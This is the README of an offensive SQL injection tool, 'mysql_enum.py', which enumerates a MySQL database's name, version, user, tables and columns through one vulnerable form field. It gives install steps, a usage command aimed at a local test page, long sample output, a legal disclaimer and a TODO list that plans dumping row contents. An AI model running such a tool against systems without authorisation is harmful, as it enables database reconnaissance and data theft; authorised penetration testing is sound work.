                    
                     ______  _     _  _    _____  _       _______ ______  _     _ ______
                    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
                    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
                    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
                    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
                    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|


## What does this thing do?

It exploits a form field on a web page that is vulnerable to sql injection and retrieves various details about the back end database which is tied to it. 

Some of the details retrieved:

 1. Database name
 2. Database version
 3. Current database user
 4. Number of tables
 5. Number of rows in each table
 6. Table names
 7. Number of columns in each table
 8. Column names of each table

## Where to use it?

While penetration testing you may find yourself in a situation where you have only one single form field vulnerable to SQL injection, but would like to know the structure of the database for further testing. 


## FEATURES

 - Specify the GET or POST data contents.
 - Specify the vulnerable field in the GET or POST data that will be sent .
 - Display output in a clean tabular format, similar to a MySQL shell.
 - Save all enumerated data to a file in json format.
 - All data is saved to the json file as it is received to retain any partial data in the event of a connection timeout/dropping.
 - Debugging option to see the GET, POST requests and their results.
 - Progress bars!


## GETTING STARTED

**Install all requirements**

    $> pip install -r requirements.txt

**USAGE**

An example of a vulnerable php code is provided in the file "vuln.php" for a proof of concept. To test, setup an Apache server with PHP and MySQL database.

The php file connects to a database which has the schema available [here](https://dev.mysql.com/doc/employee/en/employees-installation.html)

    $> python mysql_enum.py -u "http://127.0.0.1/vuln.php" -d "vulnfield:" -v "vulnfield" -t "" -r get

     ______  _     _  _    _____  _       _______ ______  _     _ ______
    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
                                                                    @pyrod


    ENUMERATING DATABASE ...

    Enumerating DB Info
    Retreiving 'dbname': 100%|██████████████████████████████████████████████████████████████████| 4/4 [00:00<00:00, 118.55it/s]

    '8' tables found, Enumerating columns ...

    Table '8': 'titles': 100%|███████████████████████████████████████████████████████████████████| 8/8 [00:25<00:00,  4.80s/it]
    +-------------------+--------------------------------+-------------------------------------+-----------+<00:00, 150.42it/s]
    | DB Name: sampledb | DB User: testuser@127.0.0.1 | DB Version: 5.4.4 | Tables: 8 |
    +-------------------+--------------------------------+-------------------------------------+-----------+
    +-------------------+--------------------------------+-------------------------------------+-----------+

    ENUMERATED TABLES FOR: http://127.0.0.1/vuln.php

    +---+------------------------------+------------+--------------+
    | 1 | Table Name: current_dept_emp | Columns: 4 | Rows: 300024 |
    +---+------------------------------+------------+--------------+
    +---+------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+-----------------------+------------+--------------+
    | 2 | Table Name: employees | Columns: 6 | Rows: 300029 |
    +---+-----------------------+------------+--------------+
    +---+-----------------------+------------+--------------+
    +-----+------------+
    | No. | Columns    |
    +-----+------------+
    | 1   | emp_no     |
    | 2   | birth_date |
    | 3   | first_name |
    | 4   | last_name  |
    | 5   | gender     |
    | 6   | hire_date  |
    +-----+------------+
    +---+-------------------------+------------+---------+
    | 3 | Table Name: departments | Columns: 2 | Rows: 9 |
    +---+-------------------------+------------+---------+
    +---+-------------------------+------------+---------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | dept_no   |
    | 2   | dept_name |
    +-----+-----------+
    +---+--------------------+------------+--------------+
    | 4 | Table Name: titles | Columns: 4 | Rows: 443308 |
    +---+--------------------+------------+--------------+
    +---+--------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | title     |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+----------------------+------------+---------------+
    | 5 | Table Name: salaries | Columns: 4 | Rows: 2844047 |
    +---+----------------------+------------+---------------+
    +---+----------------------+------------+---------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | salary    |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+--------------------------+------------+----------+
    | 6 | Table Name: dept_manager | Columns: 4 | Rows: 24 |
    +---+--------------------------+------------+----------+
    +---+--------------------------+------------+----------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+----------------------------------+------------+--------------+
    | 7 | Table Name: dept_emp_latest_date | Columns: 3 | Rows: 300024 |
    +---+----------------------------------+------------+--------------+
    +---+----------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | from_date |
    | 3   | to_date   |
    +-----+-----------+
    +---+----------------------+------------+--------------+
    | 8 | Table Name: dept_emp | Columns: 4 | Rows: 331603 |
    +---+----------------------+------------+--------------+
    +---+----------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
**JSON OUTPUT**

Json output is generated in the following format.

    {
        "date": "2019-08-07 12:16:25.430440",
        "url": "http://192.168.1.119/vuln.php",
        "info": {
            "version": "5.7.26-0ubuntu0.16.04.1",
            "dbname": "sampledb",
            "username": "testuser@192.168.1.119",
            "table_count": "8"
        },
        "tables": {
            "current_dept_emp": {
                "row_count": "300024",
                "cols": [
                    "emp_no",
                    "dept_no",
                    "from_date",
                    "to_date"
                ],
                "col_count": "4"
            },
            "departments": {
                "row_count": "9",
                "cols": [
                    "dept_no",
                    "dept_name"
                ],
                "col_count": "2"
            },
            "dept_emp": {
                "row_count": "331603",
                "cols": [
                    "emp_no",
                    "dept_no",
                    "from_date",
                    "to_date"
                ],
                "col_count": "4"
            },
            "dept_emp_latest_date": {
                "row_count": "300024",
                "cols": [
                    "emp_no",
                    "from_date",
                    "to_date"
                ],
                "col_count": "3"
            },
            "dept_manager": {
                "row_count": "24",
                "cols": [
                    "emp_no",
                    "dept_no",
                    "from_date",
                    "to_date"
                ],
                "col_count": "4"
            },
            "employees": {
                "row_count": "300029",
                "cols": [
                    "emp_no",
                    "birth_date",
                    "first_name",
                    "last_name",
                    "gender",
                    "hire_date"
                ],
                "col_count": "6"
            },
            "salaries": {
                "row_count": "2844047",
                "cols": [
                    "emp_no",
                    "salary",
                    "from_date",
                    "to_date"
                ],
                "col_count": "4"
            },
            "titles": {
                "row_count": "443308",
                "cols": [
                    "emp_no",
                    "title",
                    "from_date",
                    "to_date"
                ],
                "col_count": "4"
            }
        }
    }




## TO DO

1. Enumerate row contents for tables based on user selection for a particular table and column.
2. Code refactoring to implement a plugin architecture.
3. Multi threading, while keeping the json output format intact.
4. Test suite integration.


## CONTRIBUTING

Contributions in any form are welcome. It can be anything from correcting grammer or spellings in the documentation to adding additional enumeration functions or tests. Our goal here is to make something robust and useful.

## DISCLAIMER
All information, techniques and tools described herein are for educational purposes only. Use anything here at your own discretion, I cannot be held responsible for any damages caused to any systems or yourselves legally. 

Usage of all tools, computer code and techniques described here for testing security of systems owned by any individuals or Organisations without their prior consent is highly illegal.

It is your responsibility to obey all applicable local, state and federal laws. I assume and accept no liability and will not be responsible for any misuse or damage caused by using information herein.

## LICENSE


**GNU General Public License v3.0**

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.  If not, see <https://www.gnu.org/licenses/>
